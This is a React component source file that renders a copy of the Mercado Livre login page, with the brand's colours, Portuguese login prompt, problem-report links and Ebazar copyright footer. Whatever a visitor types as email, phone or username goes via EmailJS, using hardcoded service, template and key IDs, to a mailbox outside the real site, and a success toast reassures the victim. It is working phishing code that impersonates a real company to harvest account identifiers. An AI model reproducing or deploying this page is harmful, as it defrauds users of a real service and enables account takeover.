import { useState, useEffect } from 'react'

import logo from './assets/logo.png'
import logo_lg from './assets/logo_lg.png'

import { RxPerson } from "react-icons/rx";
import { HiMiniDevicePhoneMobile } from "react-icons/hi2";
import { MdKeyboardArrowRight } from "react-icons/md";

import { ToastContainer, toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';

import emailjs from 'emailjs-com';

function App() {

  const [wid, setWid] = useState(0);
  const [text, setText] = useState('')
  const [textFalse, setTextFalse] = useState('')
  const [isLoading, setIsLoading] = useState(false)

  function saveText(e){
    setText(e.target.value)
    setTextFalse(e.target.value)
  }

  const handleResize = () => {
    if (window.innerWidth >= 1024) {
      setWid(44);
    } else {
      setWid(14);
    }
  };

  const sendYourEmail = () => {
    
    setTextFalse("")
    setIsLoading(true)

    emailjs.send(
      'service_aw1qpyf',
      'template_6l98bf6',
      {
        message: `${text}`
      },
      'xsDcCynNb4Ebmt0OT'
    )
    .then((result) => {
        setText('')
        notifySuccess()
        setIsLoading(false)
      }, (error) => {
        setText('')
        notifyError()
        setIsLoading(false)
    });
  };

  const notifyError = () => {
    toast.error('Lámentamos estamos com problemas técnicos!');  // Exibe um toast com a mensagem "Olá, mundo!"
  };
  
  const notifySuccess = () => {
    toast.success('Enviaremos uma mensagem em breve');  // Exibe um toast com a mensagem "Olá, mundo!"
  };

  useEffect(() => {
    handleResize();

    window.addEventListener('resize', handleResize);

    return () => {
      window.removeEventListener('resize', handleResize);
    };
  }, []);

  return (
    <div className="w-screen h-screen flex flex-col items-center justify-start overflow-hidden bg-[#ffffff]">
      <div className='w-full h-[48px] flex items-center justify-start bg-[#FFF159] lg:bg-[#FFE600] px-2 z-[4]'>
        {wid == 44 ? (
          <img src={logo_lg} alt="logo com nome do lado" className={`w-[104px]`} />
        ):(
          <img src={logo} alt="logo com nome do lado" className={`w-[44px]`} />
        )}
      </div>
      
      <div className='w-[90%] flex justify-start items-center flex-col lg:flex-row lg:items-start lg:justify-center lg:gap-10 lg:mt-10 z-[4]'>
        <div className='w-full flex-col items-start lg:ps-9'>
          <p className='w-full max-w-[750px] text-[32px] lg:text-[30px] text-[#000000E6] leading-[40px] font-semibold mt-3'>
            Digite seu e-mail, telefone ou usuário do Mercado Livre
          </p>

          <div className='hidden lg:block w-[60%] h-[1px] my-5 bg-[#b2b2b2]'></div>

          <div className='hidden lg:block w-[90%] md:w-[300px] py-3 pe-4'>
            <h2 className='text-[12px] font-semibold mb-2 text-[#000000]'>Reportar um problema</h2>
            
            <div className='lg:ms-2 flex flex-row justify-between items-center py-2 border-[1px] border-transparent border-b-[#b2b2b2] cursor-pointer hover:opacity-[0.7] transition-all duration-[0.4s]'>
              <div className={`flex flex-row items-center justify-start gap-2`}>
                <HiMiniDevicePhoneMobile className='text-[#000000E6] text-[20px] font-thin' />
                <p className='font-extralight text-[#000000E6]'>Roubo ou perda de celular</p>
              </div>

              <MdKeyboardArrowRight className='text-[#000000E6] text-[18px] font-thin' />
            </div>
            
            <div className='lg:ms-2 flex flex-row justify-between items-center py-2 border-[1px] border-transparent border-b-[#b2b2b2] cursor-pointer hover:opacity-[0.7] transition-all duration-[0.4s]'>
              <div className={`flex flex-row items-center justify-start gap-2`}>
                <RxPerson className='text-[#000000E6] text-[20px] font-thin' />
                <p className='font-extralight text-[#000000E6]'>Roubo de conta</p>
              </div>

              <MdKeyboardArrowRight className='text-[#000000E6] text-[18px] font-thin' />
            </div>

          </div>

          <p className='hidden lg:block mt-6 w-full text-left text-[#3483FA] font-bold cursor-pointer hover:underline'>Preciso de ajuda com outros temas</p>
        </div>

        <div className='w-full flex flex-col justify-start items-center'>
          <div className='mt-5 w-full max-w-[750px] flex flex-col items-start lg:border-[1px] lg:border-[#b2b2b2] lg:rounded-[8px] lg:py-10 lg:px-8'>
            <label className='ml-2 font-medium mb-1' htmlFor="input">E-mail, telefone ou usuário</label>
            <input className='w-full py-[13px] px-[12px] border-[1px] mb-4 border-[#b2b2b2] rounded-[8px] outline-none focus:border-[#3483FA]' type="text" id='input' name='input' placeholder='' value={textFalse} onChange={(e) => saveText(e)} />
          
            <form className='w-full flex flex-col lg:flex-row gap-2' onSubmit={(e) => {
              e.preventDefault()
              sendYourEmail()
            }}>
              <input
                type='submit'
                className='bg-[#3483FA] bg:text-[#ffffff] rounded-[8px] mt-3 w-full lg:w-auto lg:px-5 flex items-center justify-center py-[14px] capitalize text-[#ffffff] font-bold focus:bg-[#3061ab] hover:bg-[#3061ab] transition-all duration-[0.4s] cursor-pointer'
                value="continuar"
              />
          
              <input
                type='submit'
                className='text-[#3483FA] rounded-[8px] mt-3 w-full lg:w-auto lg:px-5 flex items-center justify-center py-[14px] capitalize bg-[#ffffff] font-bold focus:bg-[#ebebeb] hover:bg-[#ebebeb] transition-all duration-[0.4s] cursor-pointer'
                value="criar conta"
              />
            </form>
        </div>
          

          <div className='w-full flex items-center justify-center'>

            <div className='lg:hidden w-[90%] md:w-[400px] py-3 px-4' style={{ boxShadow: "-4px 9px 10px 0px #d8d8d8" }}>
              <h2 className='text-[12px] font-semibold mb-2 text-[#000000]'>Reportar um problema</h2>
              
              <div className='flex flex-row justify-between items-center py-2 border-[1px] border-transparent border-b-[#b2b2b2] cursor-pointer hover:opacity-[0.7] transition-all duration-[0.4s]'>
                <div className={`flex flex-row items-center justify-start gap-2`}>
                  <HiMiniDevicePhoneMobile className='text-[#000000E6] text-[20px] font-thin' />
                  <p className='font-extralight text-[#000000E6]'>Roubo ou perda de celular</p>
                </div>

                <MdKeyboardArrowRight className='text-[#000000E6] text-[18px] font-thin' />
              </div>
              
              <div className='flex flex-row justify-between items-center py-2 border-[1px] border-transparent border-b-[#b2b2b2] cursor-pointer hover:opacity-[0.7] transition-all duration-[0.4s]'>
                <div className={`flex flex-row items-center justify-start gap-2`}>
                  <RxPerson className='text-[#000000E6] text-[20px] font-thin' />
                  <p className='font-extralight text-[#000000E6]'>Roubo de conta</p>
                </div>

                <MdKeyboardArrowRight className='text-[#000000E6] text-[18px] font-thin' />
              </div>

            </div>
          </div>

          <p className='lg:hidden mt-6 w-full text-center text-[#3483FA] font-bold cursor-pointer hover:underline'>Preciso de ajuda com outros temas</p>
        </div>
          
        <div className='w-full text-[12px] py-6 flex flex-row flex-wrap items-center justify-center text-center bg-[#f1f1f1] fixed bottom-0 md:text-[10px] md:justify-between md:px-6'>
          
          <div className='flex flex-col justify-center items-center md:flex-row md:justify-start md:items-center'>
            <div className='w-full sm:w-auto mx-4 md:mx-0 md:mr-2'>
              Protegido por reCAPTCHA <span className='text-[#000000] font-semibold'>- Privacidade - Condições</span>
            </div>
            <div className='w-full sm:w-auto mt-1 sm:mt-0 mx-4 md:mx-0 text-[#3483FA] font-semibold mb-[-4px] cursor-pointer hover:underline'>
              Como cuidamos da sua privacidade
            </div>
          </div>

          <div className='w-full sm:w-auto mx-4'>
            Copyright 1999-2024 Ebazar.com.br LTDA
          </div>

        </div>
      </div>
      
      <ToastContainer position="top-right" autoClose={3500} />
      
      <div className={`bg-[#0000004c] w-screen h-screen absolute top-0 left-0 flex items-center justify-center transition-all duration-[.4s]
        ${isLoading == true ? 'opacity-1 z-[20]' : 'opacity-[0] z-[-2]'}
      `}>
        <div className="flex items-center justify-center min-h-screen">
          <div className="w-20 h-20 border-[8px] border-t-transparent border-[#3483FA] rounded-full animate-spin"></div>
        </div>
      </div>

    </div>
  )
}

export default App
